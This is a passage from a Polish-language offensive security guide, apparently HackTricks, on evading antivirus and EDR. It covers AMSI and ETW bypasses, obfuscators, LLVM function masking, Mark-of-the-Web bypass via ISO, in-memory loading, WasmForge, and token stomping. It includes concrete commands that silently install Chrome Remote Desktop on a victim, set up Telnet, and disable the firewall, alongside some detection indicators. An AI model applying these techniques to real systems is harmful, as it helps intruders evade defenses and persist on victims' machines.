    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notatki
- Działa w PowerShell, WScript/CScript i niestandardowych loaderach (we wszystkim, co w przeciwnym razie załadowałoby AMSI).
- Połącz z przekazywaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów w wierszu poleceń.
- Stosowane w loaderach uruchamianych przez LOLBins (np. `regsvr32` wywołujący `DllRegisterServer`).

Narzędzie **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** również generuje skrypt do obejścia AMSI.
Narzędzie **[https://amsibypass.com/](https://amsibypass.com/)** również generuje skrypt do obejścia AMSI, który unika sygnatur dzięki losowym, zdefiniowanym przez użytkownika funkcjom, zmiennym i wyrażeniom znakowym oraz losowej zmianie wielkości liter w słowach kluczowych PowerShell.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie skanuje pamięć bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisuje ją instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR używające AMSI**

Listę produktów AV/EDR używających AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj PowerShell w wersji 2**
Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić:

```bash
powershell.exe -version 2
```

## Logowanie PS

Logowanie PowerShell to funkcja, która pozwala rejestrować wszystkie polecenia PowerShell wykonywane w systemie. Może to być przydatne do audytu i rozwiązywania problemów, ale może też stanowić **problem dla atakujących, którzy chcą uniknąć wykrycia**.

Aby ominąć logowanie PowerShell, możesz użyć następujących technik:

- **Wyłącz PowerShell Transcription i Module Logging**: Możesz w tym celu użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Użyj PowerShell w wersji 2**: Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania ich przez AMSI. Możesz to zrobić tak: `powershell.exe -version 2`
- **Użyj niezarządzanej sesji PowerShell**: Użyj [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), aby hostować PowerShell bez uruchamiania `powershell.exe` (takie podejście stosuje `powerpick` z Cobalt Strike). Pozwala to ominąć mechanizmy kontroli powiązane konkretnie z procesem `powershell.exe`, ale samo w sobie nie wyłącza AMSI, Script Block Logging ani innych zabezpieczeń PowerShell; zakres ochrony zależy od środowiska uruchomieniowego i implementacji hosta.


## Obfuskacja

> [!TIP]
> Kilka technik obfuskacji polega na szyfrowaniu danych, co zwiększa entropię pliku binarnego i ułatwia jego wykrycie przez AV i EDR. Zachowaj ostrożność i rozważ szyfrowanie tylko konkretnych fragmentów kodu, które zawierają wrażliwe dane lub mają pozostać ukryte.

### Deobfuskacja plików binarnych .NET chronionych przez ConfuserEx

Podczas analizy malware wykorzystującego ConfuserEx 2 (lub komercyjne forki) często napotyka się kilka warstw zabezpieczeń, które blokują dekompilatory i sandboxy. Poniższy workflow niezawodnie **przywraca kod IL niemal do oryginalnej postaci**, dzięki czemu można go następnie zdekompilować do C# za pomocą narzędzi takich jak dnSpy lub ILSpy.<sup>[[10]](#references)</sup>

1.  Usunięcie ochrony przed modyfikacją – ConfuserEx szyfruje każde *ciało metody* i odszyfrowuje je wewnątrz statycznego konstruktora *modułu* (`<Module>.cctor`). Modyfikuje też sumę kontrolną PE, przez co każda zmiana powoduje awarię pliku binarnego. Użyj **AntiTamperKiller**, aby zlokalizować zaszyfrowane tabele metadanych, odzyskać klucze XOR i przepisać czysty zestaw:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne przy tworzeniu własnego unpackera.

2.  Odzyskiwanie symboli / przepływu sterowania – przekaż *clean* plik do **de4dot-cex** (forka de4dot obsługującego ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flagi:
     • `-p crx` – wybierz profil ConfuserEx 2
     • de4dot cofnie spłaszczanie przepływu sterowania, przywróci oryginalne przestrzenie nazw, klasy i nazwy zmiennych oraz odszyfruje stałe ciągi znaków.

3.  Usuwanie wywołań proxy – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *wywołaniami proxy*), aby jeszcze bardziej utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Po tym kroku powinny być widoczne standardowe API .NET, takie jak `Convert.FromBase64String` lub `AES.Create()`, zamiast nieprzejrzystych funkcji opakowujących (`Class8.smethod_10`, …).

4.  Ręczne czyszczenie – uruchom wynikowy plik binarny w dnSpy i wyszukaj duże bloki Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby znaleźć *prawdziwy* payload.  Często malware przechowuje go jako tablicę bajtów zakodowaną w formacie TLV, inicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy łańcuch przywraca przepływ wykonania **bez** konieczności uruchamiania złośliwej próbki – przydatne podczas pracy na stacji roboczej offline.

> 🛈  ConfuserEx tworzy atrybut niestandardowy o nazwie `ConfusedByAttribute`, którego można użyć jako IOC do automatycznej wstępnej analizy próbek.

#### Jednolinijkowiec
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest udostępnienie otwartoźródłowego forka zestawu kompilacyjnego [LLVM](http://www.llvm.org/), który zwiększa bezpieczeństwo oprogramowania dzięki [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i ochronie przed modyfikacją.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje, jak używać języka `C++11/14` do generowania obfuscated code w czasie kompilacji, bez zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuscated operations wygenerowanych przez framework metaprogramowania szablonów C++, co nieco utrudnia życie osobie próbującej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to obfuscator plików binarnych x64, który potrafi obfuscate różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik kodu metamorphic dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to framework do szczegółowego code obfuscation dla języków obsługiwanych przez LLVM, wykorzystujący ROP (return-oriented programming). ROPfuscator obfuscates program na poziomie kodu asemblera, przekształcając zwykłe instrukcje w łańcuchy ROP, co zakłóca nasze naturalne pojmowanie normalnego przepływu sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi przekształcać istniejące pliki EXE/DLL w shellcode, a następnie je ładować

### Samomaskowanie poszczególnych funkcji wspomagane przez kompilator LLVM

Zamiast maskować cały implant tylko podczas uśpienia, zmodyfikowany backend LLVM X86 może utrzymywać wybrane funkcje zamaskowane przez XOR, gdy są nieaktywne. PoC Function Peekaboo wybiera zdemanglowane nazwy zawierające `REG_`, wstawia pozycjonowalne stuby wejścia/wyjścia wokół końcowego kodu maszynowego i emituje jeden współdzielony handler maskujący w `.text`; sygnatury na poziomie źródła i konwencja wywołań Windows x64 pozostają bez zmian.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformacja przepływu sterowania backendu

Transformacja powinna nastąpić po wyborze instrukcji i optymalizacji, ponieważ musi obejmować **każdą wygenerowaną instrukcję powrotu** i znać dokładny układ x86. `MachineFunctionPass` wykonywany przed emisją znajduje ostatnią instrukcję `MachineInstr::isReturn()`, usuwa ją, aby końcowa ścieżka przechodziła dalej do dołączonej epilogu, a wcześniejsze instrukcje powrotu zastępuje przez `JMP_1 handler`. Należy zachować wszelkie wygenerowane przez kompilator instrukcje przywracające stos/ramkę poprzedzające każdy powrót; przekierować należy wyłącznie samą instrukcję powrotu.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `emitFunctionBodyEnd()` emitują stuby dla poszczególnych funkcji, a `emitEndOfAsmFile()` emituje handler. Symbole współdzielone między etapami emisji pozwalają, by skok w prologu wskazywał na późniejszy epilog; przy ręcznej emisji bliskiego `je` należy zapisać `0F 84`, a następnie czterobajtowe wyrażenie MC `target - address_after_je`. Wywołania i skoki do handlera można natomiast emitować jako obiekty `MCInst` (`CALL64pcrel32` i `JMP_1`). Pass musi zwrócić `false` dla niewybranej funkcji, jeśli niczego nie zmienił; PoC błędnie zwraca w takim przypadku `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadane i inicjalizacja przed CRT

PoC umieszcza klucz XOR i rekordy 16-bajtowe zawierające relokowany przez loader wskaźnik do funkcji oraz długość określaną w czasie działania w `.funcmeta`. Chociaż pole C ma typ `uint32_t`, handler odczytuje QWORD z przesunięcia `+8` w rekordzie, obejmując długość i jej dopełnienie, a rekordy przetwarza co `0x10`. Nazwy sekcji PE mają tylko osiem bajtów, więc wyszukiwanie w czasie działania widzi `.funcmet`. Zewnętrzny patcher dodaje wykonywalną sekcję `.stub`, zapisuje w niej stary RVA punktu wejścia i przekierowuje `AddressOfEntryPoint`; stub PIC pobiera bazę obrazu z `gs:[0x60]` → `[PEB+0x10]`, przechodzi po importach PE32+, aby rozwiązać już zaimportowaną funkcję `VirtualProtect`, i uruchamia się przed CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Inicjalizacja ustawia znacznik w `gs:[0xE8]` i wywołuje każdą funkcję z metadanych. Jej zawsze czytelny prolog zapisuje początek funkcji w `gs:[0xF0]`, wykrywa znacznik i pomija wciąż niezamaskowane ciało. Epilog używa następnie `call handler`; po zapisaniu przez handler 13 rejestrów (`0x68` bajtów) adres powrotu pod `[rsp+0x68]` wskazuje koniec przekształconej funkcji, więc `end - start` można zapisać w jej rekordzie metadanych. Po zamaskowaniu wszystkich ciał stub usuwa znacznik i wykonuje skok do `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Podczas zwykłego wywołania prolog wywołuje ten sam symetryczny handler, aby zdekodować ciało. Końcowa ścieżka przechodzi do dołączonego epilogu, a każde wcześniejsze miejsce powrotu skacze bezpośrednio do współdzielonego handlera. Zwykły epilog również używa `jmp handler`, a nie `call`, więc po ponownym zamaskowaniu `ret` handlera pobiera adres powrotu pierwotnego wywołującego i zachowuje wynik funkcji w `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Mechanizm maskowania i wskaźniki analizy

Handler znajduje bieżący rekord, pomija stały, widoczny prolog (w tej kompilacji `0x46` bajtów), zmienia ochronę pozostałej części na `PAGE_EXECUTE_READWRITE`, wykonuje XOR każdego bajtu z dolnym bajtem klucza, a następnie ustawia ochronę na `PAGE_EXECUTE_READ`. Ta sama pętla dekoduje więc kod przy wejściu i koduje go przy każdym zwykłym wyjściu.<sup>[[38]](#references)[[39]](#references)</sup>

Wskaźniki o wysokiej wartości diagnostycznej dla tego rozwiązania obejmują:<sup>[[38]](#references)[[39]](#references)</sup>

- punkt wejścia w wykonywalnej sekcji `.stub` oraz sekcję `.funcmet` zawierającą klucz i relokowane wskaźniki do `.text`;
- parsowanie PEB, tablicy importów i tablicy sekcji przed CRT, po którym następują wywołania przez każdy wskaźnik z metadanych;
- identyczne prologi PIC `call`/`pop` i liczne miejsca powrotu przekierowane do jednego handlera;
- zapisy do `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, po których następują powtarzające się zmiany ochrony przez `VirtualProtect` i bajtowe zapisy XOR do stron wykonywalnych powiązanych z obrazem.

To technika unikania skanerów pamięci, a nie ochrona kryptograficzna: spatchowany plik nadal zawiera pierwotne, jawne ciało, a debugger może zatrzymać się na `VirtualProtect` lub pętli XOR i zrzucić aktywną funkcję. Jednobajtowy XOR, czytelne metadane i stała granica `0x46` również ułatwiają odzyskanie kodu offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Sloty TEB w PoC są lokalne dla wątku, ale zmodyfikowane strony kodu są wspólne dla całego procesu. Równoczesne lub rekurencyjne wejście może więc ponownie przełączać instrukcje, gdy wykonuje je inne wywołanie; wyjątki i nielokalne wyjścia mogą również ominąć ponowne maskowanie. Solidna implementacja musi synchronizować przejścia, przywracać ochronę faktycznie zwróconą przez `lpflOldProtect`, unikać zakodowanych na stałe długości stubów, sprawdzić ścieżki `call` i `jmp` pod kątem wyrównania stosu x64 oraz wywoływać `FlushInstructionCache` po ponownym zapisaniu bajtów wykonywalnych. Microsoft wyraźnie wskazuje, że gdy modyfikowany jest kod wykonywalny, za spójność pamięci podręcznej instrukcji odpowiada wywołujący.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen i MoTW

Być może widziałeś ten ekran podczas pobierania z internetu i uruchamiania niektórych plików wykonywalnych.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa, który ma chronić użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w oparciu o reputację, co oznacza, że rzadko pobierane aplikacje wywołują SmartScreen, który ostrzega użytkownika i uniemożliwia mu uruchomienie pliku (można go jednak uruchomić, klikając Więcej informacji -> Uruchom mimo to).

**MoTW** (Mark of The Web) to [Alternate Data Stream NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony podczas pobierania plików z internetu wraz z adresem URL, z którego plik został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie ADS Zone.Identifier pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Warto pamiętać, że pliki wykonywalne podpisane **zaufanym** certyfikatem podpisu **nie wywołają SmartScreen**.

Bardzo skutecznym sposobem na zapobieganie nadawaniu payloadom Mark of The Web jest pakowanie ich do jakiegoś rodzaju kontenera, na przykład ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być stosowany do woluminów **innych niż NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloady do kontenerów wyjściowych, aby ominąć Mark-of-the-Web.

Przykładowe użycie:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Oto demo omijania SmartScreen przez pakowanie payloadów w plikach ISO za pomocą [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to wydajny mechanizm rejestrowania zdarzeń w systemie Windows, który pozwala aplikacjom i komponentom systemowym **rejestrować zdarzenia**. Może być jednak również wykorzystywany przez produkty zabezpieczające do monitorowania i wykrywania złośliwej aktywności.

Podobnie jak można wyłączyć (ominąć) AMSI, można też sprawić, by funkcja **`EtwEventWrite`** procesu w przestrzeni użytkownika natychmiast zwracała wynik bez rejestrowania żadnych zdarzeń. Osiąga się to przez załatanie funkcji w pamięci tak, aby natychmiast zwracała wynik, co skutecznie wyłącza rejestrowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) oraz [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Ładowanie binariów C# do pamięci jest znane od dawna i nadal stanowi świetny sposób na uruchamianie narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci, bez zapisywania na dysku, musimy jedynie zadbać o załatanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc itp.) umożliwia już wykonywanie zestawów C# bezpośrednio w pamięci, ale można to zrobić na różne sposoby:

- **Fork\&Run**

Ta metoda polega na **uruchomieniu nowego procesu ofiarnego**, wstrzyknięciu do niego złośliwego kodu post-exploitation, wykonaniu tego kodu, a po zakończeniu — zabiciu nowego procesu. Ma to zarówno zalety, jak i wady. Zaletą metody fork and run jest to, że wykonanie odbywa się **poza** procesem naszego implantu Beacon. Oznacza to, że jeśli coś pójdzie nie tak podczas działania post-exploitation lub zostaniemy wykryci, **znacznie zwiększa się szansa**, że nasz **implant przetrwa**. Wadą jest **większe ryzyko** wykrycia przez **detekcje behawioralne**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Ta metoda polega na wstrzyknięciu złośliwego kodu post-exploitation **do własnego procesu**. Dzięki temu można uniknąć tworzenia nowego procesu i jego skanowania przez AV, ale wadą jest **znacznie większe ryzyko** **utraty beacona**, ponieważ payload może spowodować awarię procesu.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz dowiedzieć się więcej o ładowaniu C# Assembly, przeczytaj ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz zapoznaj się z ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz też ładować C# Assemblies **z PowerShell**. Sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [film S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Przepakowywanie narzędzi .NET do WebAssembly za pomocą NativeAOT (WasmForge)

Standardowe techniki `execute-assembly` zachowują rozpoznawalny MSIL i ostatecznie inicjalizują CLR. **WasmForge** zmienia natomiast środowisko wykonawcze: przenosi projekt C# na eksperymentalny cel NativeAOT-LLVM WASI, kompiluje go z wyprzedzeniem do WebAssembly i osadza ten moduł w hoście Windows PE opartym na Wazero. Utworzony proces nie wymaga CLR, JIT ani hosta `dotnet` na komputerze docelowym, więc reguły oparte wyłącznie na nazwach zestawów zarządzanych, ładowaniu CLR, AMSI lub .NET ETW tracą bezpośrednią widoczność. Jest to technika omijania detekcji i pakowania, a nie obejście granicy uprawnień — kod gościa zachowuje uprawnienia i obserwowalne zachowanie oryginalnego narzędzia w systemie operacyjnym.<sup>[[44]](#references)[[45]](#references)</sup>

### Budowanie projektu C#

Zalecaną metodą budowania jest środowisko Docker projektu, ponieważ zawiera .NET 10 SDK, workload NativeAOT-LLVM, WASI SDK 24.0, linker oraz zależności do podpisywania. Plik `.csproj` jest wykrywany automatycznie; pojedyncze polecenie budowania wykonuje migrację, poprawki zgodności, kompilację WASM, tworzenie pliku PE i podpisywanie.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

W przypadku rozwiązywania problemów lub przeglądania wygenerowanego kodu podziel proces na `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` oraz końcowe `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Obraz kompilacyjny używa również wrappera `wasm-component-ld`, aby uniknąć kodowania komponentu WASI Preview 2 i wygenerować zwykły moduł oczekiwany przez osadzony runtime.<sup>[[44]](#references)[[45]](#references)</sup>

### Łączenie wasm32 C# z x64 Win32

Nie jest to przezroczysta rekompilacja. NativeAOT-WASI nie obsługuje niektórych funkcji BCL zorientowanych na Windows lub zmienia ich działanie, a gość wasm32 zwykle przydziela czterobajtowe sloty wskaźników, podczas gdy API x64 mogą zwracać wskaźniki ośmiobajtowe. WasmForge rozwiązuje oba problemy za pomocą następujących generowanych warstw:<sup>[[44]](#references)</sup>

1. Patcher kodu źródłowego koryguje różnice semantyczne specyficzne dla AOT i przekierowuje nieobsługiwane wywołania dotyczące rejestru, potoków, WMI, tożsamości, usług katalogowych, wersji plików, LSA i podobnych funkcji do pomocników `Wf*`.
2. Skaner P/Invoke generuje mapowania NativeAOT `DirectPInvoke`, dzięki którym wywołania `[DllImport]` są wiązane z połączonymi symbolami mostków C zamiast dynamicznie ładować zadeklarowaną bibliotekę DLL wewnątrz gościa.
3. Wskaźniki przekazywane do hosta używają typu `ulong` w C# i `uint64_t` w C. Ogólny dispatcher przekazuje wywołanie do procedury obsługi Win32 hosta; `out8_mask` oznacza prawdziwe ośmiobajtowe sloty wyjściowe, których górne połowy należy zachować. W przypadku nieoznaczonych wyjść o układzie wasm32 stosowana jest ochrona snapshot/restore, aby zapis x64 nie uszkodził sąsiednich czterech bajtów.
4. Dedykowane mostki hosta obsługują operacje, które nie pasują do ogólnego dispatchu syscalli, takie jak dostęp LSA do pamięci podręcznej biletów, operacje Kerberos/BCrypt zwracające ustrukturyzowane wyniki, ruch TCP KDC oraz zapytania LDAP.

Na przykład wrapper dla `version.dll!VerQueryValueW` przekazuje cztery adresy hosta i ustawia bity 2 i 3 (`0xC`), ponieważ wskaźnik wartości i długość są ośmiobajtowymi slotami wyjściowymi. Sam wrapper pozostaje ogólny i przekazuje nazwę biblioteki DLL, nazwę eksportu, argumenty oraz maskę do `wf_call_v2`; host wykonuje translację wskaźników i wywołuje natywne API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Ograniczenia i punkty zwrotne wykrywania

Kod intensywnie wykorzystujący refleksję, dynamiczne ładowanie zestawów, dowolne natywne funkcje zwrotne oraz złożone struktury x64 zwracane do pamięci WASM mogą nadal wymagać poprawek dla poszczególnych narzędzi lub całkowicie zawieść. Ogólne gniazda WASI Preview 2 mogą również trafiać do atrap bez działania, dlatego obsługiwane narzędzia korzystają z host shimów specyficznych dla protokołu. Weryfikuj każde polecenie w porównaniu z natywną kompilacją, zamiast zakładać równoważność funkcji.<sup>[[44]](#references)[[45]](#references)</sup>

Ta technika zmienia telemetrię, zamiast sprawiać, że payload staje się niewidoczny. Wykrywanie może skupić się na pliku PE zawierającym lub materializującym moduł WASM, zachowaniu podobnym do środowiska uruchomieniowego Wazero, nietypowym przydzielaniu i kopiowaniu pamięci hosta/gościa, ogólnym bezpośrednim wywoływaniu Win32, anomaliach podpisów i zasobów PE, a także wynikowych wywołaniach API i ruchu sieciowym. Brak zdarzeń CLR-load, AMSI lub .NET ETW nie powinien więc być traktowany jako dowód, że proces jest nieszkodliwy.<sup>[[44]](#references)</sup>

## Używanie innych języków programowania

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), można wykonywać złośliwy kod w innych językach, zapewniając zaatakowanej maszynie dostęp **do środowiska interpretera zainstalowanego na udziale SMB kontrolowanym przez atakującego**.

Zapewniając dostęp do plików binarnych interpretera i środowiska na udziale SMB, można **wykonywać dowolny kod w tych językach w pamięci** zaatakowanej maszyny.

Repozytorium wskazuje: Defender nadal skanuje skrypty, ale wykorzystanie Go, Java, PHP itp. daje nam **większą elastyczność w omijaniu statycznych sygnatur**. Testy z losowymi, nieobfuskowanymi skryptami reverse shell w tych językach zakończyły się powodzeniem.

## Ponowne hostowanie WebAssembly w celu uniknięcia analizy statycznej

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuluje tokenem dostępu produktu zabezpieczającego, takiego jak EDR lub AV. Ograniczenie uprawnień tokenu może sprawić, że proces nadal będzie działać, ale nie będzie mógł wykonywać uprzywilejowanych działań kontrolnych ani naprawczych.

Aby temu zapobiec, Windows mógłby **uniemożliwić procesom zewnętrznym** uzyskiwanie uchwytów do tokenów procesów zabezpieczających.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korzystanie z zaufanego oprogramowania

### Chrome Remote Desktop

Jak opisano w [**tym wpisie na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest wdrożyć Chrome Remote Desktop na komputerze ofiary, a następnie użyć go, by przejąć nad nim kontrolę i utrzymać persistence:<sup>[[35]](#references)</sup>
1. Pobierz plik ze strony https://remotedesktop.google.com/, kliknij „Set up via SSH”, a następnie kliknij plik MSI dla Windows, aby go pobrać.
2. Uruchom instalator po cichu na komputerze ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć na stronę Chrome Remote Desktop i kliknij „Next”. Kreator poprosi o autoryzację; kliknij przycisk „Authorize”, aby kontynuować.
4. Wykonaj dostarczone polecenie, wprowadzając wymagane zmiany: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametr `--pin` ustawia PIN bez użycia GUI).
 

## Zaawansowane techniki unikania wykrycia

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Unikanie wykrycia to bardzo złożony temat. Czasami trzeba uwzględnić wiele różnych źródeł telemetrii w jednym systemie, dlatego w dojrzałych środowiskach całkowite uniknięcie wykrycia jest praktycznie niemożliwe.

Każde środowisko, z którym się mierzysz, ma swoje mocne i słabe strony.

Zdecydowanie zachęcam do obejrzenia tego wystąpienia [@ATTL4S](https://twitter.com/DaniLJ94), aby poznać podstawy bardziej zaawansowanych technik unikania wykrycia.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To kolejne świetne wystąpienie [@mariuszbit](https://twitter.com/mariuszbit) poświęcone wielowarstwowemu unikaniu wykrycia.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Starsze techniki**

### **Sprawdź, które elementy Defender uznaje za złośliwe**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który będzie **usuwać kolejne części pliku binarnego**, aż **ustali, która część jest uznawana przez Defendera** za złośliwą, a następnie ją wyodrębni.\
Innym narzędziem robiącym **to samo jest** [**avred**](https://github.com/dobin/avred), które udostępnia usługę online pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serwer Telnet**

Aż do Windows10 wszystkie wersje Windows zawierały **serwer Telnet**, który można było zainstalować (jako administrator), wykonując:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Ustaw, aby **uruchamiał się** przy starcie systemu, i **uruchom** go teraz:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Zmień port telnetu (stealth) i wyłącz zaporę:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrzebne są pliki binarne, a nie instalator)

**NA HOŚCIE**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ na **victim**

#### **Reverse connection**

